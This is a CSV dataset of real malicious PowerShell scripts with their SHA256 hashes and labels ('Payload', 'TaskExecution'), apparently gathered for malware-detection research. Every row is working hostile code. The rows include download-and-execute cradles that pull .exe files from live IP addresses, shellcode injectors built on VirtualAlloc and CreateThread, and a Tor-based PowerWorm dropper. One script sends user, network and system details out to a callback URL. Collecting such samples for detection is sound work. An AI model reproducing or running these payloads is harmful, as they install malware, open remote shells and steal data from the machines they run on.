SHA256,Full Payload,Label
dfeb12e1da892094af79329471023b97ab7d26a03e8c2ca8d1fd93ae5091f33f,"
$EtZR = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $EtZR -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x10,0x14,0xea,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0x49,0xf2,0xe1,0x16,0xbd,0x70,0x09,0xe7,0x3d,0x15,0x83,0x02,0x0c,0x15,0xf7,0x47,0x3e,0xa5,0x73,0x05,0xb2,0x4e,0xd1,0xbe,0x41,0x22,0xfe,0xb1,0xe2,0x89,0xd8,0xfc,0xf3,0xa2,0x19,0x9e,0x77,0xb9,0x4d,0x40,0x46,0x72,0x80,0x81,0x8f,0x6f,0x69,0xd3,0x58,0xfb,0xdc,0xc4,0xed,0xb1,0xdc,0x6f,0xbd,0x54,0x65,0x93,0x75,0x56,0x44,0x02,0x0e,0x01,0x46,0xa4,0xc3,0x39,0xcf,0xbe,0x00,0x07,0x99,0x35,0xf2,0xf3,0x18,0x9c,0xcb,0xfc,0xb7,0xe1,0xe4,0x0e,0xc9,0x26,0xc2,0xf0,0xbc,0x5e,0x31,0x8c,0xc6,0xa4,0x48,0x4a,0x42,0x3f,0xea,0x19,0xf4,0x9b,0x0b,0xcd,0x63,0x6f,0x07,0xba,0xe0,0x37,0x0b,0x3d,0x24,0x4c,0x37,0xb6,0xcb,0x83,0xbe,0x8c,0xef,0x07,0x9b,0x57,0x91,0x1e,0x41,0x39,0xae,0x41,0x2a,0xe6,0x0a,0x09,0xc6,0xf3,0x26,0x50,0x8e,0x30,0x0b,0x6b,0x4e,0x5f,0x1c,0x18,0x7c,0xc0,0xb6,0xb6,0xcc,0x89,0x10,0x40,0x33,0xa0,0xe5,0xde,0xca,0x4b,0x16,0xf6,0x08,0x1f,0x46,0x60,0xb9,0x20,0x0d,0x70,0x46,0xf5,0x82,0x20,0xe8,0xa6,0x62,0x91,0x48,0x17,0x0b,0xfb,0x47,0x48,0x2b,0x04,0x82,0xe1,0xc6,0xfe,0x44,0xce,0xbf,0x0f,0x17,0xa6,0xbd,0x0f,0x06,0xf6,0x4b,0xe9,0x42,0xe8,0x1d,0xa1,0xfa,0x91,0x07,0x39,0x9b,0x5e,0x92,0x47,0x9b,0xd5,0x11,0xb7,0x55,0x1e,0x5f,0xab,0x01,0xee,0x2a,0x91,0x87,0xf1,0x80,0xbc,0x27,0x64,0x2f,0x17,0x70,0x10,0x2d,0x4e,0xb6,0xbf,0xce,0xa5,0xcd,0x76,0x5b,0x06,0xb9,0x76,0x8b,0x86,0x39,0x21,0xc1,0x86,0x51,0x95,0xb1,0xd4,0x44,0xda,0x6f,0x49,0xd5,0x4f,0x90,0x38,0x8a,0xd8,0xf8,0xc6,0xf5,0x2f,0xa7,0x39,0xd0,0xb1,0x9b,0xef,0x1c,0xc4,0xf5,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cRl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cRl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cRl,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0b3066d1e171e168973179c4397aa99ecca50102f289d742e01092f275cc820e,"
$Wc=NEW-ObJeCT SySTem.Net.WeBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAderS.Add('User-Agent',$u);$Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy;$Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS;$K='/j(\wly4+aW

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
b8884ec2482672423bc4ad1015b94b5f9cdb335dc2ccb8feac079e5886ecc332,"
'AnPaAPFbyy';$ErrorActionPreference = 'SilentlyContinue';'xThnLWHOYX';'BUxsOWlj';$ckov = (get-wmiobject Win32_ComputerSystemProduct).UUID;'VeaB';'AKSPDTe';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $ckov){;'LZNELAa';'oxOOIjBw';(Get-Process -id $pid).Kill();'siguXh';'xcBDSShDh';};'MzWAhyLo';'iPeT';function e($xmg){;'NbVYubgNi';'ZLauAWN';$uf = (((iex ""nslookup -querytype=txt $xmg 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'JTYVLq';'BZkguQ';$hjwh.DownloadFile($uf, $pzzn);'qBbYTSA';'TpjBOLf';$tgj = $yhdh.NameSpace($pzzn).Items();'UtizioM';'kqXMeb';$yhdh.NameSpace($sk).CopyHere($tgj, 20);'VMdyPuyTQI';'ifVLd';rd $pzzn;'NlyDYpgGTB';'lfZJqwnG';};'JK';'FogK';'wYTkGFcdLP';'sxRHUws';'qaKift';'hXJhjzXBfwr';$sk = $env:APPDATA + '\' + $ckov;'RKxeVi';'uHIzODeeDU';if (!(Test-Path $sk)){;'jCMZqGTbnq';'qFcJkCqpi';$gbj = New-Item -ItemType Directory -Force -Path $sk;'iEn';'vhnVY';$gbj.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'SrsMaYsv';'lKGyyQp';};'fhSzDOfA';'OErIwn';'jIjy';'mTRqJIH';$lb=$sk+ '\tor.exe';'IPepjId';'rkLluBxOCEC';$khfu=$sk+ '\polipo.exe';'cBrzGkUO';'QQc';$pzzn=$sk+'\'+$ckov+'.zip';'TrXj';'amvhzHSu';$hjwh=New-Object System.Net.WebClient;'SeUfCgzj';'jpymtAhmI';$yhdh=New-Object -C Shell.Application;'aIKmTYBlW';'IbUSFJomNVD';'JTG';'Nt';if (!(Test-Path $lb) -or !(Test-Path $khfu)){;'vod';'SkxcYT';e 'i.vankin.de';'WpPGZvyDN';'EqfhMv';};'QxUZSu';'QGo';'xbqpFPYPnvP';'oy';if (!(Test-Path $lb) -or !(Test-Path $khfu)){;'BIEaI';'OhfnBeRVnN';e 'gg.ibiz.cc';'NN';'zcdlKafklzw';};'UXYXOfhpO';'CYkFJ';'mLr';'EUHifQEeNh';$thbv=$sk+'\roaminglog';'rxlscEVXb';'wDxZmjLcvNP';saps $lb -Ar "" --Log `""notice file $thbv`"""" -wi Hidden;'oDZLMXLplOJ';'CqQQUYkN';do{sleep 1;$uy=gc $thbv}while(!($uy -match 'Bootstrapped 100%: Done.'));'SRjoZKP';'eRWtrbjy';saps $khfu -a ""socksParentProxy=localhost:9050"" -wi Hidden;'EkHIrNI';'WzkXtC';sleep 7;'MoievMb';'qOHIrJWg';$nra=New-Object System.Net.WebProxy(""localhost:8123"");'ZjxfCL';'IVOUKIm';$nra.useDefaultCredentials = $true;'otTgCpy';'SoRyTuTWB';$hjwh.proxy=$nra;'pLGc';'WuVFJj';$pj='http://powerwormjqj42hu.onion/get.php?s=setup&mom=4C4C4544-004D-5110-8035-C6C04F463253&uid=' + $ckov;'BO';'HUclPRLMdbp';while(!$bm){$bm=$hjwh.downloadString($pj)};'beegAUp';'pGY';if ($bm -ne 'none'){;'zbkaxm';'xPYEweCmgQ';iex $bm;'gwEVdBB';'NDsCwRmsFr';};'zJNCCx';

",TaskExecution
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
42eb1c595240f6c35d3ff0d2889f569031c2e17a51b94be24c680e843e0c4d3a,"
$user = whoami
$ip = ipconfig /all | out-string
$wmi = Get-WmiObject -Class Win32_ComputerSystem | out-string 


$temp  = [System.Text.Encoding]::UTF8.GetBytes($user)
$userEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($ip)
$ipEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($wmi)
$wmiEnc = [System.Convert]::ToBase64String($temp)

$url = ""https://callback.1cn.ca/information.html""

$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add(""U"", $userEnc)
$NVC.Add(""I"", $ipEnc)
$NVC.Add(""W"", $wmiEnc)

$wc = New-Object System.Net.WebClient     
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.UploadValues($URL,""post"", $NVC)

",TaskExecution
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ba854bbeea607a04c07a4d0e900692c495771cdb8f299bade0728fa592b637a3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7acb2b6e86de1a4427bfa37f74f523dfbc651e011e7836915797eeec504c3c2d,"
$wC=NEW-OBJEcT SyStEm.NET.WEbCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDeRs.AdD('User-Agent',$u);$wC.PROXY = [SySTem.NEt.WEbReQUEst]::DeFAulTWEbPrOXY;$Wc.PRoxY.CrEDENTIaLs = [SYstEm.NEt.CreDEntIalCAche]::DEFAulTNEtWorKCrEdeNtIAlS;$K='?$~tvolIm%(f31,^E2.|d9Bgj@:s8D_7';$I=0;[cHar[]]$B=([char[]]($WC.DOwnLOAdSTRiNG(""http://23.116.90.9:80/index.asp"")))|%{$_-BXoR$K[$I++%$K.LeNgTh]};IEX ($B-jOIn'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
